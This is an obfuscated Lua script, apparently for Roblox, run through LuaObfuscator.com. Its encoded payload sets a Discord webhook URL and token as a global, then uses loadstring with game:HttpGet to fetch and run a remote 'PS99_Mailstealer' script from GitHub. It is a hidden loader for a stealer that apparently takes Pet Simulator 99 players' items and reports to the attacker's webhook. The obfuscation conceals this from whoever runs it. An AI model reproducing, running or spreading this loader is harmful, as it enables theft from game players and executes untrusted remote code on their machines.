--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v82=v2(v0(v30,16));if v19 then local v92=0;local v93;while true do if (v92==1) then return v93;end if (v92==0) then v93=v5(v82,v19);v19=nil;v92=1;end end else return v82;end end end);local function v20(v31,v32,v33) if v33 then local v83=(v31/(((1642 -(1523 + 114)) -(3 + 0))^(v32-(2 -1))))%((3 -1)^(((v33-(2 -1)) -(v32-1)) + (620 -(555 + 64)))) ;return v83-(v83%(932 -((1221 -364) + 74))) ;else local v84=568 -(367 + 201) ;local v85;while true do if (v84==0) then v85=(929 -(214 + 713))^(v32-((1066 -(68 + 997)) + 0)) ;return (((v31%(v85 + v85))>=v85) and (1 + 0)) or (877 -(282 + 595)) ;end end end end local function v21() local v34=(2347 -1077) -(226 + 1044) ;local v35;while true do if (v34==(0 + 0)) then v35=v1(v16,v18,v18);v18=v18 + (4 -3) ;v34=1;end if (v34==(118 -(32 + 85))) then return v35;end end end local function v22() local v36=0 -0 ;local v37;local v38;while true do if ((0 -0)==v36) then v37,v38=v1(v16,v18,v18 + (352 -(87 + 263)) );v18=v18 + (4 -2) ;v36=1 + 0 ;end if (v36==1) then return (v38 * (436 -(67 + 113))) + v37 ;end end end local function v23() local v39,v40,v41,v42=v1(v16,v18,v18 + (1000 -(915 + 82)) );v18=v18 + ((2706 -1750) -(468 + 334 + 150)) ;return (v42 * (45169940 -28392724)) + (v41 * ((156342 -37463) -53343)) + (v40 * (187 + 69)) + v39 ;end local function v24() local v43=v23();local v44=v23();local v45=1 + 0 ;local v46=(v20(v44,1188 -(1069 + 118) ,(817 -(201 + 571)) -25 ) * ((3 -1)^(6 + 26))) + v43 ;local v47=v20(v44,37 -16 ,31);local v48=((v20(v44,1170 -(116 + 1022) )==1) and  -(1 + 0)) or (792 -(368 + 423)) ;if (v47==(0 -0)) then if (v46==(18 -(10 + 8))) then return v48 * (0 -0) ;else v47=443 -(416 + 26) ;v45=0 -0 ;end elseif (v47==2047) then return ((v46==(0 + 0)) and (v48 * ((1 -(0 -0))/(438 -(145 + 293))))) or (v48 * NaN) ;end return v8(v48,v47-(1453 -(44 + 386)) ) * (v45 + (v46/((1488 -(998 + 488))^(17 + 21 + 14)))) ;end local function v25(v49) local v50;if  not v49 then local v86=0 -0 ;while true do if (v86==(0 -(0 + 0))) then v49=v23();if (v49==(859 -(814 + 45))) then return "";end break;end end end v50=v3(v16,v18,(v18 + v49) -(2 -1) );v18=v18 + v49 ;local v51={};for v66=1 + 0 , #v50 do v51[v66]=v2(v1(v3(v50,v66,v66)));end return v6(v51);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v52=(function() return 0;end)();local v53=(function() return;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();local v59=(function() return;end)();while true do if (2~=v52) then else v57[ #"asd"]=(function() return v21();end)();for v94= #">",v23() do local v95=(function() return v21();end)();if (v20(v95, #"|", #"~")~=0) then else local v103=(function() return 142 -(72 + 70) ;end)();local v104=(function() return;end)();local v105=(function() return;end)();local v106=(function() return;end)();while true do if (v103~=2) then else if (v20(v105, #"]", #",")== #">") then v106[2]=(function() return v59[v106[2]];end)();end if (v20(v105,2,2)== #"/") then v106[ #"19("]=(function() return v59[v106[ #"xxx"]];end)();end v103=(function() return 1265 -(1091 + 171) ;end)();end if (v103==1) then local v117=(function() return 0 + 0 ;end)();while true do if (v117==(3 -2)) then v103=(function() return 2;end)();break;end if (v117~=(0 -0)) then else v106=(function() return {v22(),v22(),nil,nil};end)();if (v104==0) then local v123=(function() return 0;end)();local v124=(function() return;end)();while true do if (0~=v123) then else v124=(function() return 0;end)();while true do if (v124~=(0 -0)) then else v106[ #"xnx"]=(function() return v22();end)();v106[ #"0313"]=(function() return v22();end)();break;end end break;end end elseif (v104== #"}") then v106[ #"19("]=(function() return v23();end)();elseif (v104==(700 -(208 + 490))) then v106[ #"-19"]=(function() return v23() -((1 + 1)^(8 + 8)) ;end)();elseif (v104== #"xxx") then local v293=(function() return 836 -(660 + 176) ;end)();local v294=(function() return;end)();while true do if (0~=v293) then else v294=(function() return 0;end)();while true do if ((0 + 0)==v294) then v106[ #"xnx"]=(function() return v23() -((204 -(14 + 188))^(691 -(534 + 141))) ;end)();v106[ #"0836"]=(function() return v22();end)();break;end end break;end end end v117=(function() return 1;end)();end end end if (v103==0) then v104=(function() return v20(v95,2, #"91(");end)();v105=(function() return v20(v95, #"?id=",6);end)();v103=(function() return 1 + 0 ;end)();end if (v103==(3 + 0)) then if (v20(v105, #"gha", #"-19")== #"|") then v106[ #".com"]=(function() return v59[v106[ #"?id="]];end)();end v54[v94]=(function() return v106;end)();break;end end end end for v96= #"|",v23() do v55,v96,v28=(function() return v53(v55,v96,v28);end)();end return v57;end if (v52==1) then local v90=(function() return 0 + 0 ;end)();while true do if (v90~=(3 -1)) then else v52=(function() return 2;end)();break;end if (v90==(0 -0)) then v57=(function() return {v54,v55,nil,v56};end)();v58=(function() return v23();end)();v90=(function() return 1 + 0 ;end)();end if (v90==1) then v59=(function() return {};end)();for v107= #"~",v58 do local v108=(function() return 0 + 0 ;end)();local v109=(function() return;end)();local v110=(function() return;end)();local v111=(function() return;end)();while true do if (v108==(396 -(115 + 281))) then v109=(function() return 0;end)();v110=(function() return nil;end)();v108=(function() return 2 -1 ;end)();end if (v108~=(1 + 0)) then else v111=(function() return nil;end)();while true do if (v109==0) then v110=(function() return v21();end)();v111=(function() return nil;end)();v109=(function() return 2 -1 ;end)();end if (1==v109) then if (v110== #".") then v111=(function() return v21()~=(0 -0) ;end)();elseif (v110==(869 -(550 + 317))) then v111=(function() return v24();end)();elseif (v110== #"asd") then v111=(function() return v25();end)();end v59[v107]=(function() return v111;end)();break;end end break;end end end v90=(function() return 2;end)();end end end if (v52~=0) then else local v91=(function() return 0 -0 ;end)();while true do if (v91==(1 -0)) then v55=(function() return {};end)();v56=(function() return {};end)();v91=(function() return 5 -3 ;end)();end if (v91==(287 -(134 + 151))) then v52=(function() return 1;end)();break;end if (0==v91) then v53=(function() return function(v112,v113,v114) local v115=(function() return 1665 -(970 + 695) ;end)();local v116=(function() return;end)();while true do if (v115~=(0 -0)) then else v116=(function() return 0;end)();while true do if (v116==0) then local v125=(function() return 1990 -(582 + 1408) ;end)();while true do if (v125==(0 -0)) then v112[v113-#"!" ]=(function() return v114();end)();return v112,v113,v114;end end end end break;end end end;end)();v54=(function() return {};end)();v91=(function() return 1;end)();end end end end end local function v29(v60,v61,v62) local v63=v60[1 -0 ];local v64=v60[7 -5 ];local v65=v60[3];return function(...) local v68=v63;local v69=v64;local v70=v65;local v71=v27;local v72=1825 -(1195 + 629) ;local v73= -(1 -(0 -0));local v74={};local v75={...};local v76=v12("#",...) -(4 -3) ;local v77={};local v78={};for v87=0,v76 do if ((1386==1386) and (v87>=v70)) then v74[v87-v70 ]=v75[v87 + 1 ];else v78[v87]=v75[v87 + 1 ];end end local v79=(v76-v70) + (242 -(187 + 54)) ;local v80;local v81;while true do local v88=780 -(162 + 618) ;while true do if (v88==(1 + 0)) then if (v81<=(21 + (1806 -(503 + 1293)))) then if ((137==137) and (v81<=15)) then if ((v81<=(14 -7)) or (1570>=4332)) then if (v81<=(4 -1)) then if (v81<=(1 + 0)) then if (v81>(1636 -(1373 + (734 -471)))) then v78[v80[1002 -(451 + 549) ]][v78[v80[3]]]=v80[2 + 2 ];else local v130=v80[2];local v131,v132=v71(v78[v130](v13(v78,v130 + (1 -(0 + 0)) ,v73)));v73=(v132 + v130) -(1 -0) ;local v133=(2445 -(810 + 251)) -(746 + 638) ;for v248=v130,v73 do local v249=0;while true do if (v249==(0 + 0)) then v133=v133 + 1 + 0 ;v78[v248]=v131[v133];break;end end end end elseif ((v81>(1 + 1)) or (4064<=1819)) then v72=v80[4 -1 ];elseif  not v78[v80[343 -(218 + 111 + 12) ]] then v72=v72 + (1582 -(1535 + 46)) ;else v72=v80[3 + 0 ];end elseif (v81<=(1 + 4)) then if ((v81==(564 -(306 + 254))) or (4986<1574)) then local v135=v80[1 + 1 ];local v136=v78[v80[5 -2 ]];v78[v135 + (1468 -(899 + 568)) ]=v136;v78[v135]=v136[v80[4]];else local v140=0;local v141;while true do if (v140==((533 -(43 + 490)) + 0)) then v141=v80[4 -2 ];v78[v141]=v78[v141](v13(v78,v141 + (604 -(268 + 335)) ,v73));break;end end end elseif (v81>(296 -(60 + 230))) then v78[v80[2]]();else v78[v80[574 -((1159 -(711 + 22)) + 146) ]]=v80[1 + 2 ] + v78[v80[1460 -(282 + 1174) ]] ;end elseif ((4426>172) and (v81<=(822 -(569 + 242)))) then if (v81<=(25 -16)) then if (v81>(1 + (26 -19))) then v78[v80[1026 -(706 + 318) ]]=v78[v80[1254 -(721 + 530) ]];else v78[v80[1273 -(945 + 326) ]]=v80[7 -(863 -(240 + 619)) ] + v78[v80[4 + 0 ]] ;end elseif ((586>455) and (v81>(710 -(271 + 429)))) then v78[v80[2]]=v78[v80[3]][v80[4 + 0 ]];else for v250=v80[1502 -(1408 + 92) ],v80[3] do v78[v250]=nil;end end elseif (v81<=13) then if (v81>(1098 -(461 + 151 + 474))) then local v148=1288 -(993 + 295) ;local v149;while true do if (v148==(0 + 0)) then v149=v80[1173 -(418 + 753) ];do return v13(v78,v149,v73);end break;end end else local v150=(0 -0) + 0 ;local v151;while true do if ((826==826) and (v150==0)) then v151=v80[1 + 1 ];v78[v151](v13(v78,v151 + 1 + 0 + 0 ,v73));break;end end end elseif (v81>(4 + (1754 -(1344 + 400)))) then v72=v80[3];else v78[v80[(936 -(255 + 150)) -(406 + 123) ]]={};end elseif (v81<=(1792 -(1749 + 20))) then if (v81<=(5 + 14)) then if (v81<=(1339 -(1249 + 73))) then if ((v81==16) or (4019>4441)) then local v154=v80[1 + 1 ];v78[v154](v13(v78,v154 + (1146 -(466 + 535 + 144)) ,v73));else v78[v80[(3 + 1) -2 ]]=v80[8 -5 ];end elseif (v81>(1918 -(106 + 1794))) then v78[v80[1 + 1 ]]();else v78[v80[1 + 1 ]]= #v78[v80[8 -5 ]];end elseif (v81<=(56 -35)) then if (v81==(134 -(4 + 110))) then v78[v80[(2503 -1917) -(57 + 527) ]]=v78[v80[3]] + v80[1431 -(41 + 1386) ] ;else v78[v80[105 -(17 + 86) ]][v78[v80[(9 -6) + 0 ]]]=v78[v80[8 -4 ]];end elseif (v81==(63 -41)) then if (v78[v80[2]]==v80[(1909 -(404 + 1335)) -(122 + 44) ]) then v72=v72 + 1 ;else v72=v80[5 -2 ];end else local v161=v80[2];local v162=v78[v161];local v163=v78[v161 + (6 -4) ];if (v163>(0 + 0)) then if (v162>v78[v161 + 1 ]) then v72=v80[1 + 2 ];else v78[v161 + (5 -2) ]=v162;end elseif (v162<v78[v161 + (66 -(30 + 35)) ]) then v72=v80[3];else v78[v161 + 3 + (406 -(183 + 223)) ]=v162;end end elseif (v81<=(1284 -(1043 + (259 -45)))) then if (v81<=25) then if (v81==(90 -66)) then v78[v80[1214 -(323 + 889) ]][v80[7 -4 ]]=v78[v80[4]];else v78[v80[2]]=v78[v80[3]][v80[4]];end elseif (v81==(606 -(361 + 219))) then v78[v80[322 -(53 + 267) ]]=v61[v80[3]];else local v170=v80[1 + 1 ];local v171=v78[v170];local v172=v78[v170 + (415 -(15 + 398)) ];if ((2017<4261) and (v172>(982 -(18 + 964)))) then if ((4716>80) and (v171>v78[v170 + 1 ])) then v72=v80[(8 + 3) -8 ];else v78[v170 + 2 + 1 + 0 ]=v171;end elseif (v171<v78[v170 + 1 ]) then v72=v80[2 + (338 -(10 + 327)) ];else v78[v170 + (853 -(20 + 830)) ]=v171;end end elseif ((v81<=(23 + 6)) or (3507==3272)) then if (v81>(154 -(116 + 10))) then local v173=v69[v80[1 + 2 ]];local v174;local v175={};v174=v10({},{__index=function(v252,v253) local v254=v175[v253];return v254[1][v254[740 -(542 + 196) ]];end,__newindex=function(v255,v256,v257) local v258=0 -0 ;local v259;while true do if (v258==(0 + 0)) then v259=v175[v256];v259[1 + 0 ][v259[1 + 1 ]]=v257;break;end end end});for v260=2 -1 ,v80[9 -5 ] do v72=v72 + (1552 -(1126 + 425)) ;local v261=v68[v72];if ((v261[406 -(118 + 287) ]==39) or (876>=3075)) then v175[v260-((1 + 2) -(451 -(108 + 341))) ]={v78,v261[380 -(142 + 235) ]};else v175[v260-(4 -3) ]={v61,v261[5 -2 ]};end v77[ #v77 + 1 + 0 ]=v175;end v78[v80[2 + 0 ]]=v29(v173,v174,v62);else local v177=v80[2 + 0 ];do return v78[v177](v13(v78,v177 + 1 + 0 ,v80[(3 -1) + 1 ]));end end elseif (v81==(65 -35)) then if ((4352>2554) and  not v78[v80[5 -3 ]]) then v72=v72 + 1 ;else v72=v80[6 -3 ];end else v78[v80[1 + 1 ]]=v78[v80[472 -(270 + 199) ]]%v78[v80[19 -15 ]] ;end elseif (v81<=(800 -(239 + 514))) then if ((v81<=39) or (4406<4043)) then if ((v81<=(5 + 8 + 22)) or (1889>=3383)) then if (v81<=(1362 -(797 + 532))) then if (v81>(24 + 8)) then local v179=v80[2];do return v78[v179](v13(v78,v179 + 1 ,v80[3]));end else local v180=v80[1 + 1 ];do return v13(v78,v180,v73);end end elseif ((1892<=2734) and (v81>(79 -45))) then local v181=(3021 -(580 + 1239)) -((1108 -735) + 829) ;local v182;while true do if ((1923<2218) and (v181==(731 -(476 + 255)))) then v182=v80[1132 -(369 + 761) ];v78[v182]=v78[v182](v13(v78,v182 + 1 + 0 + 0 ,v73));break;end end else local v183=0 + 0 ;local v184;while true do if (v183==0) then v184=v80[2 -0 ];v78[v184]=v78[v184](v13(v78,v184 + 1 ,v80[5 -2 ]));break;end end end elseif ((2173>379) and (v81<=(275 -(64 + 174)))) then if (v81==(6 + 30)) then local v185=v80[2 -0 ];local v186=v78[v80[3]];v78[v185 + 1 ]=v186;v78[v185]=v186[v80[(149 + 191) -(144 + 192) ]];else local v190=v80[218 -(42 + 174) ];v78[v190]=v78[v190](v13(v78,v190 + 1 + 0 ,v80[3 + 0 ]));end elseif ((v81>(17 + 21)) or (2591==3409)) then v78[v80[2]]=v78[v80[(3934 -2427) -(363 + 709 + 432) ]];else local v194=v80[1582 -(1183 + 397) ];local v195=v78[v194 + (5 -3) ];local v196=v78[v194] + v195 ;v78[v194]=v196;if ((4514>3324) and (v195>(0 + 0))) then if (v196<=v78[v194 + 1 + 0 ]) then v72=v80[1978 -((3080 -(645 + 522)) + 62) ];v78[v194 + 3 ]=v196;end elseif (v196>=v78[v194 + (1791 -(1010 + 780)) ]) then local v322=0 + 0 ;while true do if (v322==(0 + 0)) then v72=v80[7 -4 ];v78[v194 + (14 -11) ]=v196;break;end end end end elseif ((v81<=(1976 -(565 + 1368))) or (208>=4828)) then if (v81<=(154 -113)) then if ((v81>(1701 -(1477 + 184))) or (1583>3567)) then local v198=v80[2 -0 ];local v199,v200=v71(v78[v198](v78[v198 + 1 ]));v73=(v200 + v198) -(1 + 0) ;local v201=0;for v263=v198,v73 do v201=v201 + (857 -(564 + 292)) ;v78[v263]=v199[v201];end else for v266=v80[(5 -3) -0 ],v80[3] do v78[v266]=nil;end end elseif (v81==(126 -(1920 -(1045 + 791)))) then v78[v80[306 -(244 + 60) ]]={};else do return;end end elseif (v81<=(35 + 10)) then if (v81>(520 -(41 + (1101 -666)))) then v78[v80[1003 -(938 + 63) ]]=v61[v80[4 -1 ]];else v78[v80[2 + 0 ]]=v78[v80[1128 -((1441 -(351 + 154)) + (1763 -(1281 + 293))) ]] + v80[2 + 2 ] ;end elseif (v81==((1925 -(28 + 238)) -(1565 + 48))) then v78[v80[2]]=v78[v80[2 + 1 ]]%v80[1142 -(782 + 356) ] ;else local v207=v80[269 -(176 + 91) ];local v208,v209=v71(v78[v207](v13(v78,v207 + (2 -1) ,v80[6 -3 ])));v73=(v209 + v207) -(1 -0) ;local v210=1092 -(975 + 117) ;for v268=v207,v73 do v210=v210 + 1 ;v78[v268]=v208[v210];end end elseif (v81<=55) then if (v81<=(1926 -(157 + 1718))) then if (v81<=((1599 -(1381 + 178)) + 9)) then if (v81==(170 -122)) then v78[v80[6 -4 ]]=v78[v80[3]]%v78[v80[1022 -(697 + 321) ]] ;else local v212=v69[v80[(7 + 0) -4 ]];local v213;local v214={};v213=v10({},{__index=function(v271,v272) local v273=v214[v272];return v273[1 -0 ][v273[4 -2 ]];end,__newindex=function(v274,v275,v276) local v277=v214[v275];v277[1 + 0 ][v277[3 -1 ]]=v276;end});for v279=2 -1 ,v80[1231 -(322 + 905) ] do v72=v72 + 1 ;local v280=v68[v72];if ((v280[612 -(602 + 9) ]==(1228 -(449 + 740))) or (1313==794)) then v214[v279-(873 -(826 + 38 + 8)) ]={v78,v280[1 + 2 ]};else v214[v279-1 ]={v61,v280[3]};end v77[ #v77 + 1 ]=v214;end v78[v80[6 -4 ]]=v29(v212,v213,v62);end elseif ((3174>2902) and (v81>(42 + 8))) then v78[v80[3 -1 ]]=v78[v80[8 -5 ]]%v80[4] ;else v78[v80[2]][v80[1208 -(902 + 303) ]]=v78[v80[(27 -19) -4 ]];end elseif (v81<=53) then if (v81==(125 -73)) then local v219=v80[2 + 0 ];local v220,v221=v71(v78[v219](v13(v78,v219 + (471 -(381 + 89)) ,v80[3])));v73=(v221 + v219) -(1 + 0) ;local v222=0;for v282=v219,v73 do v222=v222 + (1691 -(1121 + 569)) ;v78[v282]=v220[v222];end else local v223=214 -(22 + 192) ;local v224;local v225;local v226;local v227;while true do if ((4120<=4260) and (v223==(685 -(483 + 178 + 22)))) then for v323=v224,v73 do v227=v227 + (1464 -(1404 + 59)) ;v78[v323]=v225[v227];end break;end if (v223==0) then v224=v80[(4 + 1) -3 ];v225,v226=v71(v78[v224](v13(v78,v224 + (1 -0) ,v73)));v223=766 -(468 + 297) ;end if ((v223==(563 -(334 + 228))) or (883>4778)) then v73=(v226 + v224) -(3 -2) ;v227=0 -(0 -0) ;v223=2 -0 ;end end end elseif ((v81>(16 + 38)) or (3620>=4891)) then local v228=v80[238 -(141 + 95) ];local v229=v78[v228 + 2 ];local v230=v78[v228] + v229 ;v78[v228]=v230;if (v229>(0 + 0)) then if (v230<=v78[v228 + 1 ]) then local v326=0 -0 ;while true do if (v326==(0 -0)) then v72=v80[1 + 2 ];v78[v228 + (8 -5) ]=v230;break;end end end elseif ((4258>937) and (v230>=v78[v228 + 1 + 0 ])) then v72=v80[(1158 -(1074 + 82)) + 1 ];v78[v228 + (4 -1) ]=v230;end else do return;end end elseif (v81<=(35 + 24)) then if (v81<=57) then if ((v81>(219 -(92 + 71))) or (4869<906)) then v78[v80[1 + 1 ]]= #v78[v80[4 -1 ]];else v78[v80[767 -(574 + 191) ]]=v62[v80[3 + (0 -0) ]];end elseif (v81>(145 -(1871 -(214 + 1570)))) then local v235=v80[2];local v236,v237=v71(v78[v235](v78[v235 + 1 ]));v73=(v237 + v235) -(1 + 0) ;local v238=849 -(254 + (2050 -(990 + 465))) ;for v285=v235,v73 do local v286=126 -(55 + 30 + 41) ;while true do if ((v286==((0 + 0) -0)) or (1225>4228)) then v238=v238 + (1791 -(573 + 1217)) ;v78[v285]=v236[v238];break;end end end else v78[v80[5 -3 ]]=v62[v80[1 + 2 ]];end elseif ((3328>2238) and (v81<=(97 -36))) then if ((3839>1405) and (v81==(999 -(714 + 225)))) then v78[v80[5 -3 ]][v78[v80[3 -0 ]]]=v80[1 + 3 ];else v78[v80[2 -(0 + 0) ]]=v80[809 -(118 + 688) ];end elseif (v81==(110 -(25 + 23))) then v78[v80[1 + 1 ]][v78[v80[1889 -(927 + 959) ]]]=v78[v80[13 -9 ]];elseif ((v78[v80[2]]==v80[736 -(16 + (2817 -2101)) ]) or (1293<=507)) then v72=v72 + 1 ;else v72=v80[3];end v72=v72 + (1 -0) ;break;end if ((97 -(11 + 86))==v88) then v80=v68[v72];v81=v80[2 -1 ];v88=286 -(175 + 110) ;end end end end;end return v29(v28(),{},v17)(...);end return v15("LOL!1E3Q0003063Q00737472696E6703043Q006368617203043Q00627974652Q033Q0073756203053Q0062697433322Q033Q0062697403043Q0062786F7203053Q007461626C6503063Q00636F6E63617403063Q00696E73657274026Q001840030A3Q00F139FD444BE654D833F203073Q0026BD569C201885026Q00144003083Q0014528B950806418A03053Q00705613C5DE026Q00104003083Q00233117C4F5AA5D1303073Q0030764272B69BCB028Q0003073Q008B232C1EB3292503043Q0076DC464E026Q00F03F03023Q005F4703793Q00682Q7470733A2Q2F646973636F72642E636F6D2F6170692F776562682Q6F6B732F312Q3337363539323733373433363935392Q322F3571456E3575736F68456A413845334F694F714A44634275525842567A36646A43667735766258566A74534F76676C6F453957554C744C696F7148436D705F316263336D030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q7470476574034D3Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F4B692Q75502F50532Q395F4D61696C737465616C65722F6D61696E2F4D61696C537465616C65722E6C75612Q0100534Q000E7Q001238000100013Q002019000100010002001238000200013Q002019000200020003001238000300013Q002019000300030004001238000400053Q0006020004000B000100010004033Q000B0001001238000400063Q002019000500040007001238000600083Q002019000600060009001238000700083Q00201900070007000A00061D00083Q000100062Q00273Q00074Q00273Q00014Q00273Q00054Q00273Q00024Q00273Q00034Q00273Q00064Q0009000900083Q001211000A000C3Q001211000B000D4Q00250009000B00020010323Q000B00092Q0009000900083Q001211000A000F3Q001211000B00104Q00250009000B00020010323Q000E00092Q0009000900083Q001211000A00123Q001211000B00134Q00250009000B00020010323Q001100092Q0009000900083Q001211000A00153Q001211000B00164Q00250009000B00020010323Q00140009001211000900144Q000A000A000A3Q00263F0009002D000100140004033Q002D0001001211000A00143Q00263F000A003D000100170004033Q003D0001001238000B00183Q002019000C3Q0014002001000B000C0019001238000B001A3Q001238000C001B3Q002024000C000C001C001211000E001D4Q0034000C000E4Q0023000B3Q00022Q0013000B000100010004033Q0052000100263F000A0030000100140004033Q00300001001211000B00143Q00263F000B0044000100170004033Q00440001001211000A00173Q0004033Q0030000100263F000B0040000100140004033Q00400001001238000C00183Q002019000D3Q0011002019000E3Q000E2Q003E000C000D000E001238000C00183Q002019000D3Q000B002001000C000D001E001211000B00173Q0004033Q004000010004033Q003000010004033Q005200010004033Q002D00012Q002B3Q00013Q00013Q00023Q00026Q00F03F026Q00704002264Q000E00025Q001211000300014Q003900045Q001211000500013Q0004170003002100012Q001A00076Q0009000800024Q001A000900014Q001A000A00024Q001A000B00034Q001A000C00044Q0009000D6Q0009000E00063Q002014000F000600012Q0034000C000F4Q0023000B3Q00022Q001A000C00034Q001A000D00044Q0009000E00014Q0039000F00014Q0030000F0006000F001008000F0001000F2Q0039001000014Q00300010000600100010080010000100100020140010001000012Q0034000D00106Q000C6Q0023000A3Q000200202E000A000A00022Q00290009000A4Q001000073Q00010004370003000500012Q001A000300054Q0009000400024Q0021000300044Q000D00036Q002B3Q00017Q00",v9(),...);
